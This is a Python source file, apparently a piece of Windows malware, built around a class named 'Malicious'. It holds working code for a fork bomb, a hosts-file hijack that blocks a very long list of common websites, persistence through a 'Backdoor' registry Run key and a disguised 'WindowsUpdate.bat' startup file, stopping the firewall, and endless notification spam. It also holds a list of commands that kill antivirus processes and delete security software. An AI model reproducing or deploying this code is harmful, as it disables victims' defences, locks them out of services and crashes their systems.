import os
import subprocess
import sys
import shutil
import getpass
import win10toast
import typing as t
import re


class Malicious:
    def __init__(self) -> None:
        pass

    def blockWebsites(self, data: t.Optional[t.Iterable] = None) -> None:
        wlist = data
        if data is None:
            wlist = Data.website_list
        if len(data) == 0:
            wlist = Data.website_list

        redirect = "127.0.0.1"
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"

        with open(hosts_path, 'r+') as file:
            content = file.read()
            for website in wlist:
                if website in content:
                    pass
                else:
                    file.write(redirect + " " + website + "\n")

    def forkBomb(self) -> None:
        while True:
            subprocess.Popen([sys.executable, sys.argv[0]],
                             creationflags=subprocess.CREATE_NEW_CONSOLE)

    def restartOnStartup(self, filee: t.Optional[str] = None) -> None:
        # Normal Startup Trick
        location = os.environ["appdata"] + \
            "\\MicrosoftSecurityServiceSecondary." + filee

        if not os.path.exists(location):
            shutil.copyfile(sys.executable, location)
            subprocess.call(
                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)

        # adding .bat to startup folder
        # wont't work if the file is deleted
        def addBatFileStartup(filePath: t.Optional[str] = None, fileName: t.Optional[str] = None):
            if filePath == "":
                filePath = os.path.dirname(os.path.realpath(__file__))
                # we could also use this
                # filePath = os.environ["appdata"] + "\\" + fileName

            bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % getpass.getuser()
            with open(bat_path + '\\' + "WindowsUpdate.bat", "w+") as bat_file:
                bat_file.write(r'start "" %s' % filePath)

        addBatFileStartup()

    def changeTime(self, time: t.Optional[str] = "00:00") -> None:
        if re.match(r'^\d{2}:\d{2}$', time):
            os.system(f'time {time}')

    def disableFirewallTemp(self) -> None:
        os.system('net stop "MpsSvc"')
        os.system('taskkill /f /t /im "FirewallControlPanel.exe"')

    def notification(self, title: str, message: str, icon: t.Optional[str] = None, duration: t.Optional[int] = 5, limit: t.Optional[int] = None) -> None:
        if limit is None:
            while True:
                toaster = win10toast.ToastNotifier()
                toaster.show_toast(
                    title, message, icon_path=icon, duration=duration)
        else:
            for _ in range(limit):
                toaster = win10toast.ToastNotifier()
                toaster.show_toast(
                    title, message, icon_path=icon, duration=duration)

    def disableAV(self) -> None:
        for command in Data.antivirus_commands:
            os.system(command)


class Data:

    website_list = [
        "www.facebook.com", "facebook.com", "instragram.com", "www.instragram.com",
        "www.google.com", "google.com", "youtube.com", "www.youtube.com",
        "pornhub.com", "www.pornhub.com", "sex.com", "www.sex.com", "xnxx.com",
        "www.xnxx.com", "discord.com", "www.discord.com", "wwwi.discordapp.com",
        "www.discordapp.com", "www.photos.google.com", "photos.google.com",
        "mail.google.com", "www.mail.google.com", "gmail.com", "www.gmail.com",
        "abc.xyz", "www.abc.xyz", "www.github.com", "github.com", "github.io",
        "www.github.io", "www.daraz.lk", "daraz.lk", "aliexpress.com",
        "www.aliexpress.com", "alibaba.com", "www.alibaba.com", "teachable.com",
        "www.teachable.com", "gov.lk", "www.gov.lk", "health.gov.lk",
        "www.health.gov.lk", "paypal.com", "www.paypal.com", "spotify.com",
        "www.spotify.com", "netlix.com", "www.netflix.com", "amazon.com",
        "www.amazon.com", "wikiepedia.org", "www.wikiepedia.org", "yahoo.com",
        "www.yahoo.com", "reddit.com", "www.reddit.com", "twitter.com",
        "www.twitter.com", "ebay.com", "www.ebay.com", "xvideos.com",
        "www.xvideos.com", "cnn.com", "www.cnn.com", "fandom.com",
        "www.fandom.com", "zoon.us", "www.zoom.us", "walmart.com",
        "www.walmart.com", "craigslist.org", "www.craiglist.org", "weather.com",
        "www.weather.com", "espn.com", "www.espn.com", "imbd.com", "www.imbd.com",
        "foxnew.com", "www.foxnews.com", "linkedin.com", "www.linkedin.com",
        "microsoft.com", "www.microsoft.com", "live.com", "www.live.com",
        "being.com", "www.being.com", "usps.com", "www.usps.com", "msn.com",
        "www.msn.com", "xhamster.com", "www.xhamster.com", "quora.com",
        "www.quora.com", "linustechtips.com", "www.linustechtips.com",
        "lttstore.com", "www.lttstore.com", "apple.com", "www.apple.com",
        "yelp.com", "www.yelp.com", "www.webmd.com", "www.webmd.com", "fedex.com",
        "www.fedex.com", "stackoverflow.com", "www.stackoverflow.com", "nulled.to",
        "www.nulled.to", "weather.gov", "www.weather.gov", "tripadvisor.com",
        "www.tripadvisor.com", "ikman.lk", "www.ikman.lk", "hirufm.lk",
        "www.hirufm.lk", "google.lk", "www.google.lk", "kaymu.lk", "www.kaymu.lk",
        "hirunew.lk", "www.hirunews.lk", "yamu.lk", "www.yamu.lk", "topjobs.lk",
        "www.topjobs.lk", "wix.com", "www.wix.com", "espncricinfo.com",
        "www.espncricinfo.com", "pinterest.com", "www.pinterest.com",
        "gossiplankanews.com", "www.gossiplankanews.com", "lankacnews.com",
        "www.lankacnews.com", "yts.mx", "www.ytx.mx", "yts.am", "www.ytx.am",
        "lankacnews.com", "www.lankacnews.com", "slt.lk", "www.slt.lk",
        "office.com", "www.office.com", "dialog.lk", "www.dialog.lk", "mobitel.lk",
        "www.mobitel.lk", "whatsapp.com", "www.whatsapp.com", "newsfirst.lk",
        "www.newsfirst.lk", "cmb.ac.lk", "www.amb.ac.lk", "elakiri.com",
        "www.elakiri.com", "riyasewana.com", "www.riyasewana.com", "jvpnews.com",
        "www.jvpnews.com", "myshopify.com", "www.myshopify.com",
        "microsoftonline.com", "www.microsoftonline.com", "fiver.com",
        "www.fiver.com", "www.blogger.com", "blogger.com", "http://apple.com",
        "http://youtube.com", "http://www.google.com", "http://www.blogger.com",
        "http://support.google.com", "http://play.google.com", "http://cloudflare.com",
        "http://microsoft.com", "http://mozilla.org", "http://docs.google.com", "http://maps.google.com",
        "http://youtu.be", "http://linkedin.com", "http://en.wikipedia.org", "http://wordpress.org",
        "http://adobe.com", "http://accounts.google.com", "http://sites.google.com", "http://plus.google.com",
        "http://googleusercontent.com", "http://europa.eu", "http://drive.google.com",
        "http://vimeo.com", "http://github.com", "http://pt.wikipedia.org", "http://istockphoto.com",
        "http://amazon.com", "http://vk.com", "http://uol.com.br", "http://bbc.co.uk", "http://cnn.com",
        "http://es.wikipedia.org", "http://facebook.com", "http://bp.blogspot.com", "http://creativecommons.org",
        "http://live.com", "http://news.google.com", "http://whatsapp.com", "http://wikimedia.org",
        "http://hugedomains.com", "http://dailymotion.com", "http://get.google.com", "http://google.es",
        "http://globo.com", "http://bbc.com", "http://gstatic.com", "http://myspace.com", "http://abril.com.br",
        "http://reuters.com", "http://mail.ru", "http://developers.google.com", "http://google.co.jp", "http://w3.org",
        "http://imdb.com", "http://theguardian.com", "http://fr.wikipedia.org", "http://google.de", "http://slideshare.net",
        "http://mail.google.com", "http://issuu.com", "http://google.com.br", "http://nytimes.com", "http://t.me",
        "http://forbes.com", "http://nih.gov", "http://www.yahoo.com", "http://line.me", "http://policies.google.com",
        "http://paypal.com", "http://feedburner.com", "http://msn.com", "http://brandbucket.com", "http://dropbox.com",
        "http://medium.com", "http://jimdofree.com", "http://opera.com", "http://www.weebly.com", "http://latimes.com",
        "http://youronlinechoices.com", "http://steampowered.com", "http://networkadvertising.org", "http://buydomains.com",
        "http://dailymail.co.uk", "http://tools.google.com", "http://bit.ly", "http://lefigaro.fr", "http://apache.org",
        "http://wikia.com", "http://mediafire.com", "http://rakuten.co.jp", "http://files.wordpress.com", "http://telegram.me",
        "http://google.fr", "http://usatoday.com", "http://scribd.com", "http://ig.com.br", "http://cpanel.net",
        "http://it.wikipedia.org", "http://terra.com.br", "http://myaccount.google.com", "http://businessinsider.com",
        "http://booking.com", "http://samsung.com", "http://independent.co.uk", "http://draft.blogger.com", "http://who.int",
        "http://news.yahoo.com", "http://webmd.com", "http://android.com", "http://amazon.co.jp", "http://4shared.com",
        "http://id.wikipedia.org", "http://cpanel.com", "http://amazon.co.uk", "http://wa.me", "http://google.pl",
        "http://search.google.com", "http://foxnews.com", "http://dan.com", "http://translate.google.com",
        "http://picasaweb.google.com", "http://huffingtonpost.com", "http://www.gov.uk", "http://google.ru", "http://nasa.gov",
        "http://ebay.com", "http://tinyurl.com", "http://google.co.uk", "http://thesun.co.uk", "http://huffpost.com",
        "http://elpais.com", "http://hatena.ne.jp", "http://aliexpress.com", "http://books.google.com", "http://telegraph.co.uk",
        "http://pinterest.com", "http://aol.com", "http://un.org", "http://wsj.com", "http://aboutads.info",
        "http://twitter.com", "http://namecheap.com", "http://photos.google.com", "http://change.org", "http://archive.org",
        "http://cnet.com", "http://cdc.gov", "http://time.com", "http://bloomberg.com", "http://plesk.com", "http://fb.com",
        "http://office.com", "http://wired.com", "http://google.it", "http://amazon.de", "http://ok.ru", "http://fandom.com",
        "http://harvard.edu", "http://goo.gl", "http://washingtonpost.com", "http://abcnews.go.com", "http://marketingplatform.google.com",
        "http://de.wikipedia.org", "http://gravatar.com", "http://bandcamp.com", "http://e-monsite.com", "http://walmart.com",
        "http://ign.com", "http://digg.com", "http://sedo.com", "http://abc.net.au", "http://shopify.com", "http://ziddu.com",
        "http://m.wikipedia.org", "http://finance.yahoo.com", "http://depositfiles.com", "http://google.co.id",
        "http://mirror.co.uk", "http://google.com.tw", "http://clickbank.net", "http://wp.com", "http://icann.org",
        "http://list-manage.com", "http://mit.edu", "http://t.co", "http://enable-javascript.com", "http://hollywoodreporter.com",
        "http://naver.com", "http://lemonde.fr", "http://biglobe.ne.jp", "http://trustpilot.com",
        "http://sciencedirect.com", "http://ted.com", "http://stackoverflow.com", "http://express.co.uk",
        "http://ja.wikipedia.org", "http://engadget.com", "http://imageshack.us", "http://doubleclick.net",
        "http://oup.com", "http://espn.com", "http://xbox.com", "http://amazon.es", "http://researchgate.net",
        "http://ietf.org", "http://instagram.com", "http://playstation.com", "http://hp.com", "http://bitly.com",
        "http://forms.gle", "http://elmundo.es", "http://pbs.org", "http://rapidshare.com", "http://secureserver.net",
        "http://asus.com", "http://photobucket.com", "http://techcrunch.com", "http://buzzfeed.com", "http://spotify.com",
        "http://repubblica.it", "http://britannica.com", "http://yahoo.co.jp", "http://sciencemag.org", "http://soundcloud.com",
        "http://cbc.ca", "http://smh.com.au", "http://ipv4.google.com", "http://news.com.au", "http://disqus.com",
        "http://blackberry.com", "http://bund.de", "http://loc.gov", "http://php.net", "http://ovh.com", "http://groups.google.com",
        "http://storage.googleapis.com", "http://ovh.co.uk", "http://sciencedaily.com", "http://netflix.com", "http://unesco.org",
        "http://discord.gg", "http://amazon.fr", "http://yelp.com", "http://npr.org", "http://sapo.pt", "http://imageshack.com",
        "http://nbcnews.com", "http://themeforest.net", "http://instructables.com", "http://psychologytoday.com",
        "http://picasa.google.com", "http://berkeley.edu", "http://sputniknews.com", "http://kickstarter.com", "http://columbia.edu",
        "http://nginx.com", "http://google.nl", "http://www.wix.com", "http://usnews.com", "http://mega.nz", "http://afternic.com",
        "http://alibaba.com", "http://shutterstock.com", "http://cbsnews.com", "http://my.yahoo.com", "http://gnu.org",
        "http://arxiv.org", "http://deezer.com", "http://akamaihd.net", "http://google.co.in", "http://urbandictionary.com",
        "http://huawei.com", "http://abc.es", "http://goodreads.com", "http://discord.com", "http://lycos.com", "http://mysql.com",
        "http://whitehouse.gov", "http://netvibes.com", "http://ytimg.com", "http://bloglovin.com", "http://ria.ru",
        "http://indiatimes.com", "http://nydailynews.com", "http://alexa.com", "http://pl.wikipedia.org", "http://ru.wikipedia.org",
        "http://guardian.co.uk", "http://economist.com", "http://ft.com", "http://noaa.gov", "http://www.over-blog.com",
        "http://welt.de", "http://spiegel.de", "http://gmail.com", "http://detik.com", "http://ovh.net", "http://newsweek.com",
        "http://thetimes.co.uk", "http://mozilla.com", "http://umich.edu", "http://rottentomatoes.com", "http://disney.com",
        "http://yadi.sk", "http://eventbrite.com", "http://wikihow.com", "http://stanford.edu", "http://rambler.ru", "http://gofundme.com",
        "http://nypost.com", "http://twitch.tv", "http://cornell.edu", "http://wiley.com", "http://ibm.com", "http://rt.com",
        "http://fda.gov", "http://tripadvisor.com", "http://nature.com", "http://cnbc.com", "http://godaddy.com", "http://weibo.com",
        "http://chicagotribune.com", "http://oracle.com", "http://sendspace.com", "http://www.wikipedia.org", "http://gizmodo.com",
        "http://bing.com", "http://metro.co.uk", "http://academia.edu", "http://theverge.com", "http://about.com", "http://mashable.com",
        "http://sfgate.com", "http://newyorker.com", "http://nationalgeographic.com", "http://quora.com", "http://privacyshield.gov",
        "http://nginx.org", "http://ca.gov", "http://qq.com", "http://ggpht.com", "http://surveymonkey.com", "http://box.com",
        "http://nikkei.com", "http://ikea.com", "http://variety.com", "http://pixabay.com", "http://hm.com", "http://theatlantic.com",
        "http://googleblog.com", "http://code.google.com", "http://yandex.ru", "http://addtoany.com", "http://adssettings.google.com",
        "http://ea.com", "http://google.ca", "http://dw.com", "http://allaboutcookies.org", "http://zendesk.com", "http://addthis.com",
        "http://washington.edu", "http://cambridge.org", "http://etsy.com", "http://vice.com", "http://sina.com.cn", "http://so-net.ne.jp",
        "http://parallels.com", "http://utexas.edu", "http://ap.org", "http://coursera.org", "http://nicovideo.jp", "http://ubuntu.com",
        "http://searchenginejournal.com", "http://espn.go.com", "http://interia.pl", "http://xing.com", "http://zdnet.com", "http://goo.ne.jp",
        "http://pexels.com", "http://dot.tk", "http://feedproxy.google.com", "http://about.me", "http://evernote.com", "http://freepik.com",
        "http://steamcommunity.com", "http://psu.edu", "http://thedailybeast.com", "http://mystrikingly.com", "http://adweek.com",
        "http://soratemplates.com", "http://thefreedictionary.com", "http://behance.net", "http://springer.com", "http://biblegateway.com",
        "http://offset.com", "http://snapchat.com", "http://target.com", "http://tabelog.com", "http://scientificamerican.com",
        "http://answers.com", "http://liveinternet.ru", "http://state.gov", "http://dreniq.com", "http://daum.net", "http://corriere.it",
        "http://www.livejournal.com", "http://softpedia.com", "http://narod.ru", "http://unicef.org", "http://axs.com",
        "http://pinterest.co.uk", "http://salon.com", "http://last.fm", "http://khanacademy.org", "http://canada.ca", "http://windows.net",
        "http://sakura.ne.jp", "http://prezi.com", "http://over-blog-kiwi.com", "http://ftc.gov", "http://si.edu", "http://answers.yahoo.com",
        "http://house.gov", "http://unsplash.com", "http://standard.co.uk", "http://google.com.au", "http://dell.com", "http://bp1.blogger.com",
        "http://000webhost.com", "http://outlook.com", "http://en.wordpress.com", "http://oecd.org", "http://digitaltrends.com",
        "http://doi.org", "http://airbnb.com", "http://example.com",
        "http://ameblo.jp", "http://epa.gov", "http://prestashop.com", "http://orkut.com.br",
        "http://amzn.to", "http://ebay.co.uk", "http://scoop.it", "http://entrepreneur.com",
        "http://www.canalblog.com", "http://usgs.gov", "http://weather.com", "http://undeveloped.com",
        "http://feedburner.google.com", "http://pastebin.com", "http://lifehacker.com", "http://amazon.ca",
        "http://worldbank.org", "http://e-recht24.de", "http://upenn.edu", "http://arstechnica.com",
        "http://go.co", "http://viglink.com", "http://ehow.com", "http://cia.gov", "http://fifa.com",
        "http://lonelyplanet.com", "http://calameo.com", "http://prnewswire.com", "http://weforum.org",
        "http://eonline.com", "http://dreamstime.com", "http://ndtv.com", "http://gutenberg.org",
        "http://cam.ac.uk", "http://udemy.com", "http://amazon.in", "http://storage.canalblog.com",
        "http://eff.org", "http://rollingstone.com", "http://businesswire.com", "http://iso.org", "http://zeit.de",
        "http://home.neustar", "http://indiegogo.com", "http://boston.com", "http://reverbnation.com",
        "http://howstuffworks.com", "http://calendar.google.com", "http://asahi.com", "http://inc.com",
        "http://a8.net", "http://nba.com", "http://allrecipes.com", "http://com.com", "http://rediff.com",
        "http://oreilly.com", "http://stuff.co.nz", "http://cointernet.com.co", "http://fb.me", "http://greenpeace.org",
        "http://video.google.com", "http://jhu.edu", "http://theglobeandmail.com", "http://cafepress.com", "apple.com",
        "youtube.com", "www.google.com", "www.blogger.com", "support.google.com", "play.google.com", "cloudflare.com",
        "microsoft.com", "mozilla.org", "docs.google.com", "maps.google.com", "youtu.be", "linkedin.com", "en.wikipedia.org",
        "wordpress.org", "adobe.com", "accounts.google.com", "sites.google.com", "plus.google.com", "googleusercontent.com",
        "europa.eu", "drive.google.com", "vimeo.com", "github.com", "pt.wikipedia.org", "istockphoto.com", "amazon.com",
        "vk.com", "uol.com.br", "bbc.co.uk", "cnn.com", "es.wikipedia.org", "facebook.com", "bp.blogspot.com", "creativecommons.org",
        "live.com", "news.google.com", "whatsapp.com", "wikimedia.org", "hugedomains.com", "dailymotion.com", "get.google.com",
        "google.es", "globo.com", "bbc.com", "gstatic.com", "myspace.com", "abril.com.br", "reuters.com", "mail.ru", "developers.google.com",
        "google.co.jp", "w3.org", "imdb.com", "theguardian.com", "fr.wikipedia.org", "google.de", "slideshare.net", "mail.google.com",
        "issuu.com", "google.com.br", "nytimes.com", "t.me", "forbes.com", "nih.gov", "www.yahoo.com", "line.me", "policies.google.com",
        "paypal.com", "feedburner.com", "msn.com", "brandbucket.com", "dropbox.com", "medium.com", "jimdofree.com", "opera.com", "www.weebly.com",
        "latimes.com", "youronlinechoices.com", "steampowered.com", "networkadvertising.org", "buydomains.com", "dailymail.co.uk", "tools.google.com",
        "bit.ly", "lefigaro.fr", "apache.org", "wikia.com", "mediafire.com", "rakuten.co.jp", "files.wordpress.com", "telegram.me", "google.fr",
        "usatoday.com", "scribd.com", "ig.com.br", "cpanel.net", "it.wikipedia.org", "terra.com.br", "myaccount.google.com", "businessinsider.com",
        "booking.com", "samsung.com", "independent.co.uk", "draft.blogger.com", "who.int", "news.yahoo.com", "webmd.com", "android.com",
        "amazon.co.jp", "4shared.com", "id.wikipedia.org", "cpanel.com", "amazon.co.uk", "wa.me", "google.pl", "search.google.com", "foxnews.com",
        "dan.com", "translate.google.com", "picasaweb.google.com", "huffingtonpost.com", "www.gov.uk", "google.ru", "nasa.gov", "ebay.com",
        "tinyurl.com", "google.co.uk", "thesun.co.uk", "huffpost.com", "elpais.com", "hatena.ne.jp", "aliexpress.com", "books.google.com", "telegraph.co.uk",
        "pinterest.com", "aol.com", "un.org", "wsj.com", "aboutads.info", "twitter.com", "namecheap.com", "photos.google.com", "change.org", "archive.org",
        "cnet.com", "cdc.gov", "time.com", "bloomberg.com", "plesk.com", "fb.com", "office.com", "wired.com", "google.it", "amazon.de", "ok.ru", "fandom.com",
        "harvard.edu", "goo.gl", "washingtonpost.com", "abcnews.go.com", "marketingplatform.google.com", "de.wikipedia.org", "gravatar.com", "bandcamp.com",
        "e-monsite.com", "walmart.com", "ign.com", "digg.com", "sedo.com", "abc.net.au", "shopify.com", "ziddu.com", "m.wikipedia.org", "finance.yahoo.com",
        "depositfiles.com", "google.co.id", "mirror.co.uk", "google.com.tw", "clickbank.net", "wp.com", "icann.org", "list-manage.com", "mit.edu", "t.co",
        "enable-javascript.com", "hollywoodreporter.com", "naver.com", "lemonde.fr", "biglobe.ne.jp", "trustpilot.com", "sciencedirect.com", "ted.com",
        "stackoverflow.com", "express.co.uk", "ja.wikipedia.org", "engadget.com", "imageshack.us", "doubleclick.net", "oup.com", "espn.com", "xbox.com",
        "amazon.es", "researchgate.net", "ietf.org", "instagram.com", "playstation.com", "hp.com", "bitly.com", "forms.gle", "elmundo.es", "pbs.org",
        "rapidshare.com", "secureserver.net", "asus.com", "photobucket.com", "techcrunch.com", "buzzfeed.com", "spotify.com", "repubblica.it", "britannica.com",
        "yahoo.co.jp", "sciencemag.org", "soundcloud.com", "cbc.ca", "smh.com.au", "ipv4.google.com", "news.com.au", "disqus.com", "blackberry.com", "bund.de",
        "loc.gov", "php.net", "ovh.com", "groups.google.com", "storage.googleapis.com", "ovh.co.uk", "sciencedaily.com", "netflix.com", "unesco.org", "discord.gg",
        "amazon.fr", "yelp.com", "npr.org", "sapo.pt", "imageshack.com", "nbcnews.com", "themeforest.net", "instructables.com", "psychologytoday.com",
        "picasa.google.com", "berkeley.edu", "sputniknews.com", "kickstarter.com", "columbia.edu", "nginx.com", "google.nl", "www.wix.com", "usnews.com",
        "mega.nz", "afternic.com", "alibaba.com", "shutterstock.com", "cbsnews.com", "my.yahoo.com", "gnu.org", "arxiv.org", "deezer.com", "akamaihd.net",
        "google.co.in", "urbandictionary.com", "huawei.com", "abc.es", "goodreads.com", "discord.com", "lycos.com", "mysql.com", "whitehouse.gov",
        "netvibes.com", "ytimg.com", "bloglovin.com", "ria.ru", "indiatimes.com", "nydailynews.com", "alexa.com", "pl.wikipedia.org", "ru.wikipedia.org",
        "guardian.co.uk", "economist.com", "ft.com", "noaa.gov", "www.over-blog.com", "welt.de", "spiegel.de", "gmail.com", "detik.com", "ovh.net", "newsweek.com",
        "thetimes.co.uk", "mozilla.com", "umich.edu", "rottentomatoes.com", "disney.com", "yadi.sk", "eventbrite.com", "wikihow.com", "stanford.edu", "rambler.ru",
        "gofundme.com", "nypost.com", "twitch.tv", "cornell.edu", "wiley.com", "ibm.com", "rt.com", "fda.gov", "tripadvisor.com", "nature.com", "cnbc.com", "godaddy.com",
        "weibo.com", "chicagotribune.com", "oracle.com", "sendspace.com", "www.wikipedia.org", "gizmodo.com", "bing.com", "metro.co.uk", "academia.edu", "theverge.com",
        "about.com", "mashable.com", "sfgate.com", "newyorker.com", "nationalgeographic.com", "quora.com", "privacyshield.gov", "nginx.org", "ca.gov", "qq.com",
        "ggpht.com", "surveymonkey.com", "box.com", "nikkei.com", "ikea.com", "variety.com", "pixabay.com", "hm.com", "theatlantic.com", "googleblog.com", "code.google.com",
        "yandex.ru", "addtoany.com", "adssettings.google.com", "ea.com", "google.ca", "dw.com", "allaboutcookies.org", "zendesk.com", "addthis.com", "washington.edu",
        "cambridge.org", "etsy.com", "vice.com", "sina.com.cn", "so-net.ne.jp", "parallels.com", "utexas.edu", "ap.org", "coursera.org", "nicovideo.jp", "ubuntu.com",
        "searchenginejournal.com", "espn.go.com", "interia.pl", "xing.com", "zdnet.com", "goo.ne.jp", "pexels.com", "dot.tk", "feedproxy.google.com", "about.me",
        "evernote.com", "freepik.com", "steamcommunity.com", "psu.edu", "thedailybeast.com", "mystrikingly.com", "adweek.com", "soratemplates.com", "thefreedictionary.com",
        "behance.net", "springer.com", "biblegateway.com", "offset.com", "snapchat.com", "target.com", "tabelog.com", "scientificamerican.com", "answers.com",
        "liveinternet.ru", "state.gov", "dreniq.com", "daum.net", "corriere.it", "www.livejournal.com", "softpedia.com", "narod.ru", "unicef.org", "axs.com", "pinterest.co.uk",
        "salon.com", "last.fm", "khanacademy.org", "canada.ca", "windows.net", "sakura.ne.jp", "prezi.com", "over-blog-kiwi.com", "ftc.gov", "si.edu",
        "answers.yahoo.com", "house.gov", "unsplash.com", "standard.co.uk", "google.com.au", "dell.com", "bp1.blogger.com", "000webhost.com", "outlook.com",
        "en.wordpress.com", "oecd.org", "digitaltrends.com", "doi.org", "airbnb.com", "example.com", "ameblo.jp", "epa.gov", "prestashop.com", "orkut.com.br",
        "amzn.to", "ebay.co.uk", "scoop.it", "entrepreneur.com", "www.canalblog.com", "usgs.gov", "weather.com", "undeveloped.com", "feedburner.google.com",
        "pastebin.com", "lifehacker.com", "amazon.ca", "worldbank.org", "e-recht24.de", "upenn.edu", "arstechnica.com", "go.co", "viglink.com", "ehow.com",
        "cia.gov", "fifa.com", "lonelyplanet.com", "calameo.com", "prnewswire.com", "weforum.org", "eonline.com", "dreamstime.com", "ndtv.com", "gutenberg.org",
        "cam.ac.uk", "udemy.com", "amazon.in", "storage.canalblog.com", "eff.org", "rollingstone.com", "businesswire.com", "iso.org", "zeit.de", "home.neustar",
        "indiegogo.com", "boston.com", "reverbnation.com", "howstuffworks.com", "calendar.google.com", "asahi.com", "inc.com", "a8.net", "nba.com", "allrecipes.com",
        "com.com", "rediff.com", "oreilly.com", "stuff.co.nz", "cointernet.com.co", "fb.me", "greenpeace.org", "video.google.com", "jhu.edu", "theglobeandmail.com", "cafepress.com"
    ]

    antivirus_commands = [
        "net stop “Security Center”",
        "netsh firewall set opmode mode=disable",
        "tskill /A av*",
        "tskill /A fire*",
        "tskill /A anti*",
        "tskill /A spy*",
        "tskill /A bullguard",
        "tskill /A PersFw",
        "tskill /A KAV*",
        "tskill /A ZONEALARM",
        "tskill /A SAFEWEB",
        "tskill /A spy*",
        "tskill /A bullguard",
        "tskill /A PersFw",
        "tskill /A KAV*",
        "tskill /A ZONEALARM",
        "tskill /A SAFEWEB",
        "tskill /A OUTPOST",
        "tskill /A nv*",
        "tskill /A nav*",
        "tskill /A F-*",
        "tskill /A ESAFE",
        "tskill /A cle",
        "tskill /A BLACKICE",
        "tskill /A def*",
        "tskill /A kav",
        "tskill /A kav*",
        "tskill /A avg*",
        "tskill /A ash*",
        "tskill /A aswupdsv",
        "tskill /A ewid*",
        "tskill /A guard*",
        "tskill /A guar*",
        "tskill /A gcasDt*",
        "tskill /A msmp*",
        "tskill /A mcafe*",
        "tskill /A mghtml",
        "tskill /A msiexec",
        "tskill /A outpost",
        "tskill /A isafe",
        "tskill /A zap*cls",
        "tskill /A zauinst",
        "tskill /A upd*",
        "tskill /A zlclien*",
        "tskill /A minilog",
        "tskill /A cc*",
        "tskill /A norton*",
        "tskill /A norton au*",
        "tskill /A ccc*",
        "tskill /A npfmn*",
        "tskill /A loge*",
        "tskill /A nisum*",
        "tskill /A issvc",
        "tskill /A tmp*",
        "tskill /A tmn*",
        "tskill /A pcc*",
        "tskill /A cpd*",
        "tskill /A pop*",
        "tskill /A pav*",
        "tskill /A padmincls",
        "tskill /A panda*",
        "tskill /A avsch*",
        "tskill /A sche*",
        "tskill /A syman*",
        "tskill /A virus*",
        "tskill /A realm*cls",
        "tskill /A sweep*",
        "tskill /A scan*",
        "tskill /A ad-*",
        "tskill /A safe*",
        "tskill /A avas*",
        "tskill /A norm*",
        "tskill /A offg*",
        "del /Q /F C:\Program Files\alwils~1\avast4\*.*",
        "del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe",
        "del /Q /F C:\Program Files\kasper~1\*.exe",
        "del /Q /F C:\Program Files\trojan~1\*.exe",
        "del /Q /F C:\Program Files\f-prot95\*.dll",
        "del /Q /F C:\Program Files\tbav\*.datcls",
        "del /Q /F C:\Program Files\avpersonal\*.vdf",
        "del /Q /F C:\Program Files\Norton~1\*.cnt",
        "del /Q /F C:\Program Files\Mcafee\*.*",
        "del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*",
        "del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*",
        "del /Q /F C:\Program Files\Norton~1\Norton~1\*.*",
        "del /Q /F C:\Program Files\Norton~1\*.*",
        "del /Q /F C:\Program Files\avgamsr\*.exe",
        "del /Q /F C:\Program Files\avgamsvr\*.exe",
        "del /Q /F C:\Program Files\avgemc\*.exe",
        "del /Q /F C:\Program Files\avgcc\*.exe",
        "del /Q /F C:\Program Files\avgupsvc\*.exe",
        "del /Q /F C:\Program Files\grisoft",
        "del /Q /F C:\Program Files\nood32krn\*.exe",
        "del /Q /F C:\Program Files\nood32\*.exe",
        "del /Q /F C:\Program Files\nod32",
        "del /Q /F C:\Program Files\nood32",
        "del /Q /F C:\Program Files\kav\*.exe",
        "del /Q /F C:\Program Files\kavmm\*.exe",
        "del /Q /F C:\Program Files\kaspersky\*.*",
        "del /Q /F C:\Program Files\ewidoctrl\*.exe",
        "del /Q /F C:\Program Files\guard\*.exe",
        "del /Q /F C:\Program Files\ewido\*.exe",
        "del /Q /F C:\Program Files\pavprsrv\*.exe",
        "del /Q /F C:\Program Files\pavprot\*.exe",
        "del /Q /F C:\Program Files\avengine\*.exe",
        "del /Q /F C:\Program Files\apvxdwin\*.exe",
        "del /Q /F C:\Program Files\webproxy\*.exe",
        "del /Q /F C:\Program Files\panda software\*.*",]
